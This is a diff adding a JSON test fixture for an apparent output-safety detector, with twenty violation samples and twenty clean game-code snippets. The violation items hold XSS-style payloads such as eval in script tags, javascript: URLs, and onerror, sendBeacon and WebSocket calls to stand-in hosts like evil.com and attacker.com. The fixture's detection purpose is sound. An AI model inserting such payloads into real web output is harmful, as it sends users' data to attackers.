@@ -1,0 +1,243 @@
+[
+  {
+    "id": "out-001",
+    "output": "<script>eval('alert(1)')</script>",
+    "expected": "violation",
+    "violation_type": "script_eval"
+  },
+  {
+    "id": "out-002",
+    "output": "<script>  eval(  'x'  )</script>",
+    "expected": "violation",
+    "violation_type": "script_eval"
+  },
+  {
+    "id": "out-003",
+    "output": "<script type=\"text/javascript\">eval(1)</script>",
+    "expected": "violation",
+    "violation_type": "script_eval"
+  },
+  {
+    "id": "out-004",
+    "output": "const a = 1; javascript:alert(1)",
+    "expected": "violation",
+    "violation_type": "javascript_scheme"
+  },
+  {
+    "id": "out-005",
+    "output": "javascript:alert(1)",
+    "expected": "violation",
+    "violation_type": "javascript_scheme"
+  },
+  {
+    "id": "out-006",
+    "output": "<img src=x onerror=\"fetch('http://evil.com')\">",
+    "expected": "violation",
+    "violation_type": "onerror_fetch"
+  },
+  {
+    "id": "out-007",
+    "output": "<img onerror='navigator.sendBeacon(\"http://evil.com\")'>",
+    "expected": "violation",
+    "violation_type": "onerror_sendBeacon"
+  },
+  {
+    "id": "out-008",
+    "output": "window.onerror = function(){}; onerror='x'",
+    "expected": "violation",
+    "violation_type": "onerror_attr"
+  },
+  {
+    "id": "out-009",
+    "output": "const ws = new WebSocket('ws://attacker.com');",
+    "expected": "violation",
+    "violation_type": "websocket"
+  },
+  {
+    "id": "out-010",
+    "output": "new WebSocket(\"ws://attacker.com\")",
+    "expected": "violation",
+    "violation_type": "websocket"
+  },
+  {
+    "id": "out-011",
+    "output": "navigator.sendBeacon('http://evil.com', data);",
+    "expected": "violation",
+    "violation_type": "sendBeacon"
+  },
+  {
+    "id": "out-012",
+    "output": "sendBeacon('http://evil.com')",
+    "expected": "violation",
+    "violation_type": "sendBeacon"
+  },
+  {
+    "id": "out-013",
+    "output": "/* payload */ navigator.sendBeacon(\"http://evil.com\")",
+    "expected": "violation",
+    "violation_type": "sendBeacon"
+  },
+  {
+    "id": "out-014",
+    "output": "<div>click</div><script>eval('alert(1)')</script>",
+    "expected": "violation",
+    "violation_type": "script_eval"
+  },
+  {
+    "id": "out-015",
+    "output": "<div>tap</div> <img src=x onerror=\"fetch('http://evil.com')\">",
+    "expected": "violation",
+    "violation_type": "onerror_fetch"
+  },
+  {
+    "id": "out-016",
+    "output": "<script>eval( alert(1) )</script>",
+    "expected": "violation",
+    "violation_type": "script_eval"
+  },
+  {
+    "id": "out-017",
+    "output": "const x = new WebSocket('ws://attacker.com'); x.close();",
+    "expected": "violation",
+    "violation_type": "websocket"
+  },
+  {
+    "id": "out-018",
+    "output": "javascript:alert(1) + navigator.sendBeacon('http://evil.com')",
+    "expected": "violation",
+    "violation_type": "mixed"
+  },
+  {
+    "id": "out-019",
+    "output": "new WebSocket('ws://attacker.com'); onerror='x';",
+    "expected": "violation",
+    "violation_type": "mixed"
+  },
+  {
+    "id": "out-020",
+    "output": "<img src=x onerror='navigator.sendBeacon(\"http://evil.com\")'> javascript:alert(1)",
+    "expected": "violation",
+    "violation_type": "mixed"
+  },
+
+  {
+    "id": "clean-001",
+    "output": "<html><body><h1>Game</h1><button id='btn'>Click</button></body></html>",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-002",
+    "output": "function start(){ const score=0; } console.log('ok');",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-003",
+    "output": "<div class='game'>score: <span id='score'>0</span></div>",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-004",
+    "output": "document.getElementById('btn').addEventListener('click', ()=>{ /* increment */ });",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-005",
+    "output": "const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d');",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-006",
+    "output": "/* simple update loop */ setInterval(()=>{ /* tick */ }, 16);",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-007",
+    "output": "<div>tap notes</div><style>body{font-family:sans-serif}</style>",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-008",
+    "output": "function spawnEnemy(){ return {hp: 10}; }",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-009",
+    "output": "class Card{ constructor(){ this.attack=1; } }",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-010",
+    "output": "requestAnimationFrame(()=>{ /* draw */ });",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-011",
+    "output": "const level=1; const enemies = []; enemies.push({x:0,y:0});",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-012",
+    "output": "/* leaderboard */ let best = 999; best = Math.min(best, 10);",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-013",
+    "output": "<svg width='100' height='100'><circle cx='50' cy='50' r='40' fill='red'/></svg>",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-014",
+    "output": "document.addEventListener('keydown', (e)=>{ if(e.key==='ArrowLeft'){ /* move */ } });",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-015",
+    "output": "const msg = \"hello\"; console.log(msg);",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-016",
+    "output": "function update(dt){ score += 1; }",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-017",
+    "output": "<div id='hud'>Score: 0</div><div id='log'></div>",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-018",
+    "output": "/* UI only */ const button = document.querySelector('button'); button.onclick = ()=>{};",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-019",
+    "output": "Math.random(); (function(){ /* no dangerous patterns */ })();",
+    "expected": "clean",
+    "violation_type": "none"
+  },
+  {
+    "id": "clean-020",
+    "output": "<p>Normal game output: movement, scoring, particles.</p>",
+    "expected": "clean",
+    "violation_type": "none"
+  }
+]
